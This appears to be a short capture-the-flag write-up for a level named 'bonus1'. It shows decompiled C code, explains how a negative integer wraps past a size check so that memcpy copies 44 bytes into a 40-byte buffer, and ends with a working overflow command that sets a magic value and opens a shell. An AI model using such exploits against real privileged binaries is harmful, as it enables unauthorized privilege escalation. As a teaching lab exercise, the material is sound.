# Bonus 1

We have a program who take arguments:

```sh
$ ./bonus1 
Segmentation fault (core dumped)
$ ./bonus1 42
$ ./bonus1 42 42
```

By decompiling the code, we find:
```c
int main(int argc, char **argv)
{
    int arg = atoi(argv[1]);
    int test;
    if (arg > 9) {
        test = 1;
    } else {
        char buf[40];
        memcpy(&buf, argv[2], arg * 4);
        if (arg == 0x574f4c46) {
            execl("/bin/sh", "sh");
        }
        test = 0;
    }
    return test;
}
```

The problem is the next one: we need to set "arg" to 0x574f4c46 to start a shell, but the atoi prevent the value to be superior to 9.

We also see a buffer of 40, maybe we can perform a buffer overflow but same problem, the number of bytes we can put with the memcpy depends on arg who's still limited to 9.

To start, we can bypass the comparison with 9 by passing a negative value who rotates with unsigned value like: -2147483637 who will give 44 once casted.

```sh
$ python -c "print((-2147483637 * 4) & 0xFFFFFFFF)"
44
```
So know, we can bypass the first comparison, and define a size bigger than the buffer, we can perform our overflow!

./bonus1 -2147483637 $(python -c 'print("A" * 40 + "\x46\x4c\x4f\x57")')

